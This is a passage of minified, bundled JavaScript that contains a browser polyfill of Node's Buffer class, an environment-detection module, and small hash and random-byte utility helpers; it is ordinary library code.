                    throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                if (e === t)
                    return 0;
                let r = e.length
                  , n = t.length;
                for (let o = 0, i = Math.min(r, n); o < i; ++o)
                    if (e[o] !== t[o]) {
                        r = e[o],
                        n = t[o];
                        break
                    }
                return r < n ? -1 : n < r ? 1 : 0
            }
            ,
            c.isEncoding = function(e) {
                switch (String(e).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                case "latin1":
                case "binary":
                case "base64":
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return !0;
                default:
                    return !1
                }
            }
            ,
            c.concat = function(e, t) {
                if (!Array.isArray(e))
                    throw new TypeError('"list" argument must be an Array of Buffers');
                if (0 === e.length)
                    return c.alloc(0);
                let r;
                if (void 0 === t)
                    for (t = 0,
                    r = 0; r < e.length; ++r)
                        t += e[r].length;
                const n = c.allocUnsafe(t);
                let o = 0;
                for (r = 0; r < e.length; ++r) {
                    let t = e[r];
                    if (Z(t, Uint8Array))
                        o + t.length > n.length ? (c.isBuffer(t) || (t = c.from(t)),
                        t.copy(n, o)) : Uint8Array.prototype.set.call(n, t, o);
                    else {
                        if (!c.isBuffer(t))
                            throw new TypeError('"list" argument must be an Array of Buffers');
                        t.copy(n, o)
                    }
                    o += t.length
                }
                return n
            }
            ,
            c.byteLength = g,
            c.prototype._isBuffer = !0,
            c.prototype.swap16 = function() {
                const e = this.length;
                if (e % 2 !== 0)
                    throw new RangeError("Buffer size must be a multiple of 16-bits");
                for (let t = 0; t < e; t += 2)
                    m(this, t, t + 1);
                return this
            }
            ,
            c.prototype.swap32 = function() {
                const e = this.length;
                if (e % 4 !== 0)
                    throw new RangeError("Buffer size must be a multiple of 32-bits");
                for (let t = 0; t < e; t += 4)
                    m(this, t, t + 3),
                    m(this, t + 1, t + 2);
                return this
            }
            ,
            c.prototype.swap64 = function() {
                const e = this.length;
                if (e % 8 !== 0)
                    throw new RangeError("Buffer size must be a multiple of 64-bits");
                for (let t = 0; t < e; t += 8)
                    m(this, t, t + 7),
                    m(this, t + 1, t + 6),
                    m(this, t + 2, t + 5),
                    m(this, t + 3, t + 4);
                return this
            }
            ,
            c.prototype.toString = function() {
                const e = this.length;
                return 0 === e ? "" : 0 === arguments.length ? S(this, 0, e) : y.apply(this, arguments)
            }
            ,
            c.prototype.toLocaleString = c.prototype.toString,
            c.prototype.equals = function(e) {
                if (!c.isBuffer(e))
                    throw new TypeError("Argument must be a Buffer");
                return this === e || 0 === c.compare(this, e)
            }
            ,
            c.prototype.inspect = function() {
                let e = "";
                const r = t.IS;
                return e = this.toString("hex", 0, r).replace(/(.{2})/g, "$1 ").trim(),
                this.length > r && (e += " ... "),
                "<Buffer " + e + ">"
            }
            ,
            i && (c.prototype[i] = c.prototype.inspect),
            c.prototype.compare = function(e, t, r, n, o) {
                if (Z(e, Uint8Array) && (e = c.from(e, e.offset, e.byteLength)),
                !c.isBuffer(e))
                    throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof e);
                if (void 0 === t && (t = 0),
                void 0 === r && (r = e ? e.length : 0),
                void 0 === n && (n = 0),
                void 0 === o && (o = this.length),
                t < 0 || r > e.length || n < 0 || o > this.length)
                    throw new RangeError("out of range index");
                if (n >= o && t >= r)
                    return 0;
                if (n >= o)
                    return -1;
                if (t >= r)
                    return 1;
                if (this === e)
                    return 0;
                let i = (o >>>= 0) - (n >>>= 0)
                  , s = (r >>>= 0) - (t >>>= 0);
                const a = Math.min(i, s)
                  , l = this.slice(n, o)
                  , u = e.slice(t, r);
                for (let c = 0; c < a; ++c)
                    if (l[c] !== u[c]) {
                        i = l[c],
                        s = u[c];
                        break
                    }
                return i < s ? -1 : s < i ? 1 : 0
            }
            ,
            c.prototype.includes = function(e, t, r) {
                return -1 !== this.indexOf(e, t, r)
            }
            ,
            c.prototype.indexOf = function(e, t, r) {
                return b(this, e, t, r, !0)
            }
            ,
            c.prototype.lastIndexOf = function(e, t, r) {
                return b(this, e, t, r, !1)
            }
            ,
            c.prototype.write = function(e, t, r, n) {
                if (void 0 === t)
                    n = "utf8",
                    r = this.length,
                    t = 0;
                else if (void 0 === r && "string" === typeof t)
                    n = t,
                    r = this.length,
                    t = 0;
                else {
                    if (!isFinite(t))
                        throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                    t >>>= 0,
                    isFinite(r) ? (r >>>= 0,
                    void 0 === n && (n = "utf8")) : (n = r,
                    r = void 0)
                }
                const o = this.length - t;
                if ((void 0 === r || r > o) && (r = o),
                e.length > 0 && (r < 0 || t < 0) || t > this.length)
                    throw new RangeError("Attempt to write outside buffer bounds");
                n || (n = "utf8");
                let i = !1;
                for (; ; )
                    switch (n) {
                    case "hex":
                        return w(this, e, t, r);
                    case "utf8":
                    case "utf-8":
                        return T(this, e, t, r);
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return A(this, e, t, r);
                    case "base64":
                        return E(this, e, t, r);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return P(this, e, t, r);
                    default:
                        if (i)
                            throw new TypeError("Unknown encoding: " + n);
                        n = ("" + n).toLowerCase(),
                        i = !0
                    }
            }
            ,
            c.prototype.toJSON = function() {
                return {
                    type: "Buffer",
                    data: Array.prototype.slice.call(this._arr || this, 0)
                }
            }
            ;
            const I = 4096;
            function B(e, t, r) {
                let n = "";
                r = Math.min(e.length, r);
                for (let o = t; o < r; ++o)
                    n += String.fromCharCode(127 & e[o]);
                return n
            }
            function x(e, t, r) {
                let n = "";
                r = Math.min(e.length, r);
                for (let o = t; o < r; ++o)
                    n += String.fromCharCode(e[o]);
                return n
            }
            function O(e, t, r) {
                const n = e.length;
                (!t || t < 0) && (t = 0),
                (!r || r < 0 || r > n) && (r = n);
                let o = "";
                for (let i = t; i < r; ++i)
                    o += J[e[i]];
                return o
            }
            function _(e, t, r) {
                const n = e.slice(t, r);
                let o = "";
                for (let i = 0; i < n.length - 1; i += 2)
                    o += String.fromCharCode(n[i] + 256 * n[i + 1]);
                return o
            }
            function W(e, t, r) {
                if (e % 1 !== 0 || e < 0)
                    throw new RangeError("offset is not uint");
                if (e + t > r)
                    throw new RangeError("Trying to access beyond buffer length")
            }
            function R(e, t, r, n, o, i) {
                if (!c.isBuffer(e))
                    throw new TypeError('"buffer" argument must be a Buffer instance');
                if (t > o || t < i)
                    throw new RangeError('"value" argument is out of bounds');
                if (r + n > e.length)
                    throw new RangeError("Index out of range")
            }
            function k(e, t, r, n, o) {
                z(t, n, o, e, r, 7);
                let i = Number(t & BigInt(4294967295));
                e[r++] = i,
                i >>= 8,
                e[r++] = i,
                i >>= 8,
                e[r++] = i,
                i >>= 8,
                e[r++] = i;
                let s = Number(t >> BigInt(32) & BigInt(4294967295));
                return e[r++] = s,
                s >>= 8,
                e[r++] = s,
                s >>= 8,
                e[r++] = s,
                s >>= 8,
                e[r++] = s,
                r
            }
            function M(e, t, r, n, o) {
                z(t, n, o, e, r, 7);
                let i = Number(t & BigInt(4294967295));
                e[r + 7] = i,
                i >>= 8,
                e[r + 6] = i,
                i >>= 8,
                e[r + 5] = i,
                i >>= 8,
                e[r + 4] = i;
                let s = Number(t >> BigInt(32) & BigInt(4294967295));
                return e[r + 3] = s,
                s >>= 8,
                e[r + 2] = s,
                s >>= 8,
                e[r + 1] = s,
                s >>= 8,
                e[r] = s,
                r + 8
            }
            function N(e, t, r, n, o, i) {
                if (r + n > e.length)
                    throw new RangeError("Index out of range");
                if (r < 0)
                    throw new RangeError("Index out of range")
            }
            function F(e, t, r, n, i) {
                return t = +t,
                r >>>= 0,
                i || N(e, 0, r, 4),
                o.write(e, t, r, n, 23, 4),
                r + 4
            }
            function U(e, t, r, n, i) {
                return t = +t,
                r >>>= 0,
                i || N(e, 0, r, 8),
                o.write(e, t, r, n, 52, 8),
                r + 8
            }
            c.prototype.slice = function(e, t) {
                const r = this.length;
                (e = ~~e) < 0 ? (e += r) < 0 && (e = 0) : e > r && (e = r),
                (t = void 0 === t ? r : ~~t) < 0 ? (t += r) < 0 && (t = 0) : t > r && (t = r),
                t < e && (t = e);
                const n = this.subarray(e, t);
                return Object.setPrototypeOf(n, c.prototype),
                n
            }
            ,
            c.prototype.readUintLE = c.prototype.readUIntLE = function(e, t, r) {
                e >>>= 0,
                t >>>= 0,
                r || W(e, t, this.length);
                let n = this[e]
                  , o = 1
                  , i = 0;
                for (; ++i < t && (o *= 256); )
                    n += this[e + i] * o;
                return n
            }
            ,
            c.prototype.readUintBE = c.prototype.readUIntBE = function(e, t, r) {
                e >>>= 0,
                t >>>= 0,
                r || W(e, t, this.length);
                let n = this[e + --t]
                  , o = 1;
                for (; t > 0 && (o *= 256); )
                    n += this[e + --t] * o;
                return n
            }
            ,
            c.prototype.readUint8 = c.prototype.readUInt8 = function(e, t) {
                return e >>>= 0,
                t || W(e, 1, this.length),
                this[e]
            }
            ,
            c.prototype.readUint16LE = c.prototype.readUInt16LE = function(e, t) {
                return e >>>= 0,
                t || W(e, 2, this.length),
                this[e] | this[e + 1] << 8
            }
            ,
            c.prototype.readUint16BE = c.prototype.readUInt16BE = function(e, t) {
                return e >>>= 0,
                t || W(e, 2, this.length),
                this[e] << 8 | this[e + 1]
            }
            ,
            c.prototype.readUint32LE = c.prototype.readUInt32LE = function(e, t) {
                return e >>>= 0,
                t || W(e, 4, this.length),
                (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3]
            }
            ,
            c.prototype.readUint32BE = c.prototype.readUInt32BE = function(e, t) {
                return e >>>= 0,
                t || W(e, 4, this.length),
                16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3])
            }
            ,
            c.prototype.readBigUInt64LE = X((function(e) {
                V(e >>>= 0, "offset");
                const t = this[e]
                  , r = this[e + 7];
                void 0 !== t && void 0 !== r || H(e, this.length - 8);
                const n = t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24
                  , o = this[++e] + 256 * this[++e] + 65536 * this[++e] + r * 2 ** 24;
                return BigInt(n) + (BigInt(o) << BigInt(32))
            }
            )),
            c.prototype.readBigUInt64BE = X((function(e) {
                V(e >>>= 0, "offset");
                const t = this[e]
                  , r = this[e + 7];
                void 0 !== t && void 0 !== r || H(e, this.length - 8);
                const n = t * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + this[++e]
                  , o = this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + r;
                return (BigInt(n) << BigInt(32)) + BigInt(o)
            }
            )),
            c.prototype.readIntLE = function(e, t, r) {
                e >>>= 0,
                t >>>= 0,
                r || W(e, t, this.length);
                let n = this[e]
                  , o = 1
                  , i = 0;
                for (; ++i < t && (o *= 256); )
                    n += this[e + i] * o;
                return o *= 128,
                n >= o && (n -= Math.pow(2, 8 * t)),
                n
            }
            ,
            c.prototype.readIntBE = function(e, t, r) {
                e >>>= 0,
                t >>>= 0,
                r || W(e, t, this.length);
                let n = t
                  , o = 1
                  , i = this[e + --n];
                for (; n > 0 && (o *= 256); )
                    i += this[e + --n] * o;
                return o *= 128,
                i >= o && (i -= Math.pow(2, 8 * t)),
                i
            }
            ,
            c.prototype.readInt8 = function(e, t) {
                return e >>>= 0,
                t || W(e, 1, this.length),
                128 & this[e] ? -1 * (255 - this[e] + 1) : this[e]
            }
            ,
            c.prototype.readInt16LE = function(e, t) {
                e >>>= 0,
                t || W(e, 2, this.length);
                const r = this[e] | this[e + 1] << 8;
                return 32768 & r ? 4294901760 | r : r
            }
            ,
            c.prototype.readInt16BE = function(e, t) {
                e >>>= 0,
                t || W(e, 2, this.length);
                const r = this[e + 1] | this[e] << 8;
                return 32768 & r ? 4294901760 | r : r
            }
            ,
            c.prototype.readInt32LE = function(e, t) {
                return e >>>= 0,
                t || W(e, 4, this.length),
                this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24
            }
            ,
            c.prototype.readInt32BE = function(e, t) {
                return e >>>= 0,
                t || W(e, 4, this.length),
                this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]
            }
            ,
            c.prototype.readBigInt64LE = X((function(e) {
                V(e >>>= 0, "offset");
                const t = this[e]
                  , r = this[e + 7];
                void 0 !== t && void 0 !== r || H(e, this.length - 8);
                const n = this[e + 4] + 256 * this[e + 5] + 65536 * this[e + 6] + (r << 24);
                return (BigInt(n) << BigInt(32)) + BigInt(t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24)
            }
            )),
            c.prototype.readBigInt64BE = X((function(e) {
                V(e >>>= 0, "offset");
                const t = this[e]
                  , r = this[e + 7];
                void 0 !== t && void 0 !== r || H(e, this.length - 8);
                const n = (t << 24) + 65536 * this[++e] + 256 * this[++e] + this[++e];
                return (BigInt(n) << BigInt(32)) + BigInt(this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + r)
            }
            )),
            c.prototype.readFloatLE = function(e, t) {
                return e >>>= 0,
                t || W(e, 4, this.length),
                o.read(this, e, !0, 23, 4)
            }
            ,
            c.prototype.readFloatBE = function(e, t) {
                return e >>>= 0,
                t || W(e, 4, this.length),
                o.read(this, e, !1, 23, 4)
            }
            ,
            c.prototype.readDoubleLE = function(e, t) {
                return e >>>= 0,
                t || W(e, 8, this.length),
                o.read(this, e, !0, 52, 8)
            }
            ,
            c.prototype.readDoubleBE = function(e, t) {
                return e >>>= 0,
                t || W(e, 8, this.length),
                o.read(this, e, !1, 52, 8)
            }
            ,
            c.prototype.writeUintLE = c.prototype.writeUIntLE = function(e, t, r, n) {
                if (e = +e,
                t >>>= 0,
                r >>>= 0,
                !n) {
                    R(this, e, t, r, Math.pow(2, 8 * r) - 1, 0)
                }
                let o = 1
                  , i = 0;
                for (this[t] = 255 & e; ++i < r && (o *= 256); )
                    this[t + i] = e / o & 255;
                return t + r
            }
            ,
            c.prototype.writeUintBE = c.prototype.writeUIntBE = function(e, t, r, n) {
                if (e = +e,
                t >>>= 0,
                r >>>= 0,
                !n) {
                    R(this, e, t, r, Math.pow(2, 8 * r) - 1, 0)
                }
                let o = r - 1
                  , i = 1;
                for (this[t + o] = 255 & e; --o >= 0 && (i *= 256); )
                    this[t + o] = e / i & 255;
                return t + r
            }
            ,
            c.prototype.writeUint8 = c.prototype.writeUInt8 = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 1, 255, 0),
                this[t] = 255 & e,
                t + 1
            }
            ,
            c.prototype.writeUint16LE = c.prototype.writeUInt16LE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 2, 65535, 0),
                this[t] = 255 & e,
                this[t + 1] = e >>> 8,
                t + 2
            }
            ,
            c.prototype.writeUint16BE = c.prototype.writeUInt16BE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 2, 65535, 0),
                this[t] = e >>> 8,
                this[t + 1] = 255 & e,
                t + 2
            }
            ,
            c.prototype.writeUint32LE = c.prototype.writeUInt32LE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 4, 4294967295, 0),
                this[t + 3] = e >>> 24,
                this[t + 2] = e >>> 16,
                this[t + 1] = e >>> 8,
                this[t] = 255 & e,
                t + 4
            }
            ,
            c.prototype.writeUint32BE = c.prototype.writeUInt32BE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 4, 4294967295, 0),
                this[t] = e >>> 24,
                this[t + 1] = e >>> 16,
                this[t + 2] = e >>> 8,
                this[t + 3] = 255 & e,
                t + 4
            }
            ,
            c.prototype.writeBigUInt64LE = X((function(e) {
                return k(this, e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0, BigInt(0), BigInt("0xffffffffffffffff"))
            }
            )),
            c.prototype.writeBigUInt64BE = X((function(e) {
                return M(this, e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0, BigInt(0), BigInt("0xffffffffffffffff"))
            }
            )),
            c.prototype.writeIntLE = function(e, t, r, n) {
                if (e = +e,
                t >>>= 0,
                !n) {
                    const n = Math.pow(2, 8 * r - 1);
                    R(this, e, t, r, n - 1, -n)
                }
                let o = 0
                  , i = 1
                  , s = 0;
                for (this[t] = 255 & e; ++o < r && (i *= 256); )
                    e < 0 && 0 === s && 0 !== this[t + o - 1] && (s = 1),
                    this[t + o] = (e / i | 0) - s & 255;
                return t + r
            }
            ,
            c.prototype.writeIntBE = function(e, t, r, n) {
                if (e = +e,
                t >>>= 0,
                !n) {
                    const n = Math.pow(2, 8 * r - 1);
                    R(this, e, t, r, n - 1, -n)
                }
                let o = r - 1
                  , i = 1
                  , s = 0;
                for (this[t + o] = 255 & e; --o >= 0 && (i *= 256); )
                    e < 0 && 0 === s && 0 !== this[t + o + 1] && (s = 1),
                    this[t + o] = (e / i | 0) - s & 255;
                return t + r
            }
            ,
            c.prototype.writeInt8 = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 1, 127, -128),
                e < 0 && (e = 255 + e + 1),
                this[t] = 255 & e,
                t + 1
            }
            ,
            c.prototype.writeInt16LE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 2, 32767, -32768),
                this[t] = 255 & e,
                this[t + 1] = e >>> 8,
                t + 2
            }
            ,
            c.prototype.writeInt16BE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 2, 32767, -32768),
                this[t] = e >>> 8,
                this[t + 1] = 255 & e,
                t + 2
            }
            ,
            c.prototype.writeInt32LE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 4, 2147483647, -2147483648),
                this[t] = 255 & e,
                this[t + 1] = e >>> 8,
                this[t + 2] = e >>> 16,
                this[t + 3] = e >>> 24,
                t + 4
            }
            ,
            c.prototype.writeInt32BE = function(e, t, r) {
                return e = +e,
                t >>>= 0,
                r || R(this, e, t, 4, 2147483647, -2147483648),
                e < 0 && (e = 4294967295 + e + 1),
                this[t] = e >>> 24,
                this[t + 1] = e >>> 16,
                this[t + 2] = e >>> 8,
                this[t + 3] = 255 & e,
                t + 4
            }
            ,
            c.prototype.writeBigInt64LE = X((function(e) {
                return k(this, e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            }
            )),
            c.prototype.writeBigInt64BE = X((function(e) {
                return M(this, e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            }
            )),
            c.prototype.writeFloatLE = function(e, t, r) {
                return F(this, e, t, !0, r)
            }
            ,
            c.prototype.writeFloatBE = function(e, t, r) {
                return F(this, e, t, !1, r)
            }
            ,
            c.prototype.writeDoubleLE = function(e, t, r) {
                return U(this, e, t, !0, r)
            }
            ,
            c.prototype.writeDoubleBE = function(e, t, r) {
                return U(this, e, t, !1, r)
            }
            ,
            c.prototype.copy = function(e, t, r, n) {
                if (!c.isBuffer(e))
                    throw new TypeError("argument should be a Buffer");
                if (r || (r = 0),
                n || 0 === n || (n = this.length),
                t >= e.length && (t = e.length),
                t || (t = 0),
                n > 0 && n < r && (n = r),
                n === r)
                    return 0;
                if (0 === e.length || 0 === this.length)
                    return 0;
                if (t < 0)
                    throw new RangeError("targetStart out of bounds");
                if (r < 0 || r >= this.length)
                    throw new RangeError("Index out of range");
                if (n < 0)
                    throw new RangeError("sourceEnd out of bounds");
                n > this.length && (n = this.length),
                e.length - t < n - r && (n = e.length - t + r);
                const o = n - r;
                return this === e && "function" === typeof Uint8Array.prototype.copyWithin ? this.copyWithin(t, r, n) : Uint8Array.prototype.set.call(e, this.subarray(r, n), t),
                o
            }
            ,
            c.prototype.fill = function(e, t, r, n) {
                if ("string" === typeof e) {
                    if ("string" === typeof t ? (n = t,
                    t = 0,
                    r = this.length) : "string" === typeof r && (n = r,
                    r = this.length),
                    void 0 !== n && "string" !== typeof n)
                        throw new TypeError("encoding must be a string");
                    if ("string" === typeof n && !c.isEncoding(n))
                        throw new TypeError("Unknown encoding: " + n);
                    if (1 === e.length) {
                        const t = e.charCodeAt(0);
                        ("utf8" === n && t < 128 || "latin1" === n) && (e = t)
                    }
                } else
                    "number" === typeof e ? e &= 255 : "boolean" === typeof e && (e = Number(e));
                if (t < 0 || this.length < t || this.length < r)
                    throw new RangeError("Out of range index");
                if (r <= t)
                    return this;
                let o;
                if (t >>>= 0,
                r = void 0 === r ? this.length : r >>> 0,
                e || (e = 0),
                "number" === typeof e)
                    for (o = t; o < r; ++o)
                        this[o] = e;
                else {
                    const i = c.isBuffer(e) ? e : c.from(e, n)
                      , s = i.length;
                    if (0 === s)
                        throw new TypeError('The value "' + e + '" is invalid for argument "value"');
                    for (o = 0; o < r - t; ++o)
                        this[o + t] = i[o % s]
                }
                return this
            }
            ;
            const D = {};
            function L(e, t, r) {
                D[e] = class extends r {
                    constructor() {
                        super(),
                        Object.defineProperty(this, "message", {
                            value: t.apply(this, arguments),
                            writable: !0,
                            configurable: !0
                        }),
                        this.name = "".concat(this.name, " [").concat(e, "]"),
                        this.stack,
                        delete this.name
                    }
                    get code() {
                        return e
                    }
                    set code(e) {
                        Object.defineProperty(this, "code", {
                            configurable: !0,
                            enumerable: !0,
                            value: e,
                            writable: !0
                        })
                    }
                    toString() {
                        return "".concat(this.name, " [").concat(e, "]: ").concat(this.message)
                    }
                }
            }
            function j(e) {
                let t = ""
                  , r = e.length;
                const n = "-" === e[0] ? 1 : 0;
                for (; r >= n + 4; r -= 3)
                    t = "_".concat(e.slice(r - 3, r)).concat(t);
                return "".concat(e.slice(0, r)).concat(t)
            }
            function z(e, t, r, n, o, i) {
                if (e > r || e < t) {
                    const n = "bigint" === typeof t ? "n" : "";
                    let o;
                    throw o = i > 3 ? 0 === t || t === BigInt(0) ? ">= 0".concat(n, " and < 2").concat(n, " ** ").concat(8 * (i + 1)).concat(n) : ">= -(2".concat(n, " ** ").concat(8 * (i + 1) - 1).concat(n, ") and < 2 ** ") + "".concat(8 * (i + 1) - 1).concat(n) : ">= ".concat(t).concat(n, " and <= ").concat(r).concat(n),
                    new D.ERR_OUT_OF_RANGE("value",o,e)
                }
                !function(e, t, r) {
                    V(t, "offset"),
                    void 0 !== e[t] && void 0 !== e[t + r] || H(t, e.length - (r + 1))
                }(n, o, i)
            }
            function V(e, t) {
                if ("number" !== typeof e)
                    throw new D.ERR_INVALID_ARG_TYPE(t,"number",e)
            }
            function H(e, t, r) {
                if (Math.floor(e) !== e)
                    throw V(e, r),
                    new D.ERR_OUT_OF_RANGE(r || "offset","an integer",e);
                if (t < 0)
                    throw new D.ERR_BUFFER_OUT_OF_BOUNDS;
                throw new D.ERR_OUT_OF_RANGE(r || "offset",">= ".concat(r ? 1 : 0, " and <= ").concat(t),e)
            }
            L("ERR_BUFFER_OUT_OF_BOUNDS", (function(e) {
                return e ? "".concat(e, " is outside of buffer bounds") : "Attempt to access memory outside buffer bounds"
            }
            ), RangeError),
            L("ERR_INVALID_ARG_TYPE", (function(e, t) {
                return 'The "'.concat(e, '" argument must be of type number. Received type ').concat(typeof t)
            }
            ), TypeError),
            L("ERR_OUT_OF_RANGE", (function(e, t, r) {
                let n = 'The value of "'.concat(e, '" is out of range.')
                  , o = r;
                return Number.isInteger(r) && Math.abs(r) > 2 ** 32 ? o = j(String(r)) : "bigint" === typeof r && (o = String(r),
                (r > BigInt(2) ** BigInt(32) || r < -(BigInt(2) ** BigInt(32))) && (o = j(o)),
                o += "n"),
                n += " It must be ".concat(t, ". Received ").concat(o),
                n
            }
            ), RangeError);
            const q = /[^+/0-9A-Za-z-_]/g;
            function G(e, t) {
                let r;
                t = t || 1 / 0;
                const n = e.length;
                let o = null;
                const i = [];
                for (let s = 0; s < n; ++s) {
                    if (r = e.charCodeAt(s),
                    r > 55295 && r < 57344) {
                        if (!o) {
                            if (r > 56319) {
                                (t -= 3) > -1 && i.push(239, 191, 189);
                                continue
                            }
                            if (s + 1 === n) {
                                (t -= 3) > -1 && i.push(239, 191, 189);
                                continue
                            }
                            o = r;
                            continue
                        }
                        if (r < 56320) {
                            (t -= 3) > -1 && i.push(239, 191, 189),
                            o = r;
                            continue
                        }
                        r = 65536 + (o - 55296 << 10 | r - 56320)
                    } else
                        o && (t -= 3) > -1 && i.push(239, 191, 189);
                    if (o = null,
                    r < 128) {
                        if ((t -= 1) < 0)
                            break;
                        i.push(r)
                    } else if (r < 2048) {
                        if ((t -= 2) < 0)
                            break;
                        i.push(r >> 6 | 192, 63 & r | 128)
                    } else if (r < 65536) {
                        if ((t -= 3) < 0)
                            break;
                        i.push(r >> 12 | 224, r >> 6 & 63 | 128, 63 & r | 128)
                    } else {
                        if (!(r < 1114112))
                            throw new Error("Invalid code point");
                        if ((t -= 4) < 0)
                            break;
                        i.push(r >> 18 | 240, r >> 12 & 63 | 128, r >> 6 & 63 | 128, 63 & r | 128)
                    }
                }
                return i
            }
            function $(e) {
                return n.toByteArray(function(e) {
                    if ((e = (e = e.split("=")[0]).trim().replace(q, "")).length < 2)
                        return "";
                    for (; e.length % 4 !== 0; )
                        e += "=";
                    return e
                }(e))
            }
            function K(e, t, r, n) {
                let o;
                for (o = 0; o < n && !(o + r >= t.length || o >= e.length); ++o)
                    t[o + r] = e[o];
                return o
            }
            function Z(e, t) {
                return e instanceof t || null != e && null != e.constructor && null != e.constructor.name && e.constructor.name === t.name
            }
            function Y(e) {
                return e !== e
            }
            const J = function() {
                const e = "0123456789abcdef"
                  , t = new Array(256);
                for (let r = 0; r < 16; ++r) {
                    const n = 16 * r;
                    for (let o = 0; o < 16; ++o)
                        t[n + o] = e[r] + e[o]
                }
                return t
            }();
            function X(e) {
                return "undefined" === typeof BigInt ? Q : e
            }
            function Q() {
                throw new Error("BigInt not supported")
            }
        }
        ,
        6454: (e, t) => {
            "use strict";
            function r() {
                return "undefined" === typeof document && "undefined" !== typeof navigator && "ReactNative" === navigator.product
            }
            function n() {
                return "undefined" !== typeof process && "undefined" !== typeof process.versions && "undefined" !== typeof process.versions.node
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.isBrowser = t.isNode = t.isReactNative = void 0,
            t.isReactNative = r,
            t.isNode = n,
            t.isBrowser = function() {
                return !r() && !n()
            }
        }
        ,
        6499: (e, t, r) => {
            "use strict";
            r.d(t, {
                Vw: () => v,
                DO: () => i,
                CC: () => a,
                sd: () => s,
                Fe: () => o,
                Ht: () => c,
                uH: () => u,
                Id: () => b,
                qj: () => w,
                O8: () => d,
                po: () => T,
                Ow: () => h,
                fd: () => g,
                ZJ: () => m,
                DH: () => l
            });
            const n = "object" === typeof globalThis && "crypto"in globalThis ? globalThis.crypto : void 0;
            function o(e) {
                if (!Number.isSafeInteger(e) || e < 0)
                    throw new Error("positive integer expected, got " + e)
            }
            function i(e) {
                if (!((t = e)instanceof Uint8Array || ArrayBuffer.isView(t) && "Uint8Array" === t.constructor.name))
                    throw new Error("Uint8Array expected");
                for (var t, r = arguments.length, n = new Array(r > 1 ? r - 1 : 0), o = 1; o < r; o++)
                    n[o - 1] = arguments[o];
                if (n.length > 0 && !n.includes(e.length))
                    throw new Error("Uint8Array expected of length " + n + ", got length=" + e.length)
            }
            function s(e) {
                if ("function" !== typeof e || "function" !== typeof e.create)
                    throw new Error("Hash should be wrapped by utils.createHasher");
                o(e.outputLen),
                o(e.blockLen)
            }
            function a(e) {
                let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                if (e.destroyed)
                    throw new Error("Hash instance has been destroyed");
                if (t && e.finished)
                    throw new Error("Hash#digest() has already been called")
            }
            function c(e, t) {
                i(e);
                const r = t.outputLen;
                if (e.length < r)
                    throw new Error("digestInto() expects output buffer of length at least " + r)
            }
            function l(e) {
                return new Uint32Array(e.buffer,e.byteOffset,Math.floor(e.byteLength / 4))
            }
            function u() {
                for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                    t[r] = arguments[r];
                for (let n = 0; n < t.length; n++)
                    t[n].fill(0)
            }
            function d(e) {
                return new DataView(e.buffer,e.byteOffset,e.byteLength)
            }
            function h(e, t) {
                return e << 32 - t | e >>> t
            }
            const f = ( () => 68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0])();
            function p(e) {
                return e << 24 & 4278190080 | e << 8 & 16711680 | e >>> 8 & 65280 | e >>> 24 & 255
            }
            const g = f ? e => e : function(e) {
                for (let t = 0; t < e.length; t++)
                    e[t] = p(e[t]);
                return e
            }
            ;
            function y(e) {
                if ("string" !== typeof e)
                    throw new Error("string expected");
                return new Uint8Array((new TextEncoder).encode(e))
            }
            function m(e) {
                return "string" === typeof e && (e = y(e)),
                i(e),
                e
            }
            function b() {
                let e = 0;
                for (let r = 0; r < arguments.length; r++) {
                    const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                    i(t),
                    e += t.length
                }
                const t = new Uint8Array(e);
                for (let r = 0, n = 0; r < arguments.length; r++) {
                    const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                    t.set(e, n),
                    n += e.length
                }
                return t
            }
            class v {
            }
            function w(e) {
                const t = t => e().update(m(t)).digest()
                  , r = e();
                return t.outputLen = r.outputLen,
                t.blockLen = r.blockLen,
                t.create = () => e(),
                t
            }
            function T() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
                if (n && "function" === typeof n.getRandomValues)
                    return n.getRandomValues(new Uint8Array(e));
                if (n && "function" === typeof n.randomBytes)
                    return Uint8Array.from(n.randomBytes(e));
                throw new Error("crypto.getRandomValues must be defined")
            }
        }
        ,
